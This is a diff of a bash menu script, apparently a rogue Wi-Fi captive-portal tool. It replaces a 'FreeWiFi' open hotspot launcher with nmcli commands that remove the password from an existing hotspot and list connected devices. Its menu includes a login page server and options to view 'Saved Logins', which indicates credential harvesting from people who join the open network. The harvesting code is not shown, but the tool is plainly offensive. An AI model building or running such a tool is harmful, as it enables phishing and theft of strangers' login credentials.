@@ -2,49 +2,31 @@
 
 PORTAL_DIR="portal"
 LOG_FILE="logs/log.txt"
-HOTSPOT_IFACE="wlp4s0"   # Wi-Fi interface for hotspot
-INTERNET_IFACE=""         # Leave empty for hotspot-only
-SSID="FreeWiFi"
+HOTSPOT_IFACE="wlp4s0"
 
 # ---------------------------
-# Check if hotspot is running
+# Detect existing hotspot and remove password
 # ---------------------------
-is_hotspot_running() {
-    pgrep create_ap >/dev/null 2>&1
-    return $?
+make_hotspot_open() {
+    ACTIVE_HOTSPOT=$(nmcli -t -f NAME,TYPE,DEVICE connection show --active | grep ":wifi:$HOTSPOT_IFACE" | cut -d: -f1)
+    if [ -z "$ACTIVE_HOTSPOT" ]; then
+        echo "[!] No active hotspot detected on $HOTSPOT_IFACE."
+        return 1
+    fi
+
+    echo "[+] Hotspot detected: $ACTIVE_HOTSPOT. Removing password..."
+    # Set open network
+    nmcli connection modify "$ACTIVE_HOTSPOT" 802-11-wireless-security.key-mgmt none
+    nmcli connection up "$ACTIVE_HOTSPOT"
+    echo "[+] Hotspot is now open."
 }
 
 # ---------------------------
-# Start open hotspot using create_ap
+# Show connected devices
 # ---------------------------
-start_hotspot() {
-    if is_hotspot_running; then
-        echo "[!] Hotspot is already running!"
-        return
-    fi
-
-    echo "[+] Starting open hotspot..."
-    # Run hotspot in background (-B) as open network
-    sudo create_ap --no-virt "$HOTSPOT_IFACE" "$INTERNET_IFACE" "$SSID" "" -B
-    sleep 2
-
-    if is_hotspot_running; then
-        echo "[+] Open hotspot started successfully!"
-    else
-        echo "[-] Failed to start hotspot. Check your Wi-Fi interface and driver."
-    fi
-}
-
-# ---------------------------
-# Stop hotspot
-# ---------------------------
-stop_hotspot() {
-    if is_hotspot_running; then
-        sudo pkill create_ap
-        echo "[+] Hotspot stopped."
-    else
-        echo "[!] No hotspot is running."
-    fi
+show_connected_devices() {
+    echo "[+] Connected devices:"
+    arp -n | grep -v "incomplete"
 }
 
 # ---------------------------
@@ -107,14 +89,14 @@ setup() {
 }
 
 # ---------------------------
-# Main Number Menu
+# Main Menu
 # ---------------------------
 while true; do
     echo ""
     echo "====== WiFi Portal Tool ======"
     echo "1) Setup (first time)"
-    echo "2) Start Open Hotspot"
-    echo "3) Stop Hotspot"
+    echo "2) Make Existing Hotspot Open"
+    echo "3) Show Connected Devices"
     echo "4) Start Login Page Server"
     echo "5) View Saved Logins"
     echo "6) Live View Logs"
@@ -125,8 +107,8 @@ while true; do
 
     case $choice in
         1) setup ;;
-        2) start_hotspot ;;
-        3) stop_hotspot ;;
+        2) make_hotspot_open ;;
+        3) show_connected_devices ;;
         4) start_server ;;
         5) view_logs ;;
         6) live_logs ;;
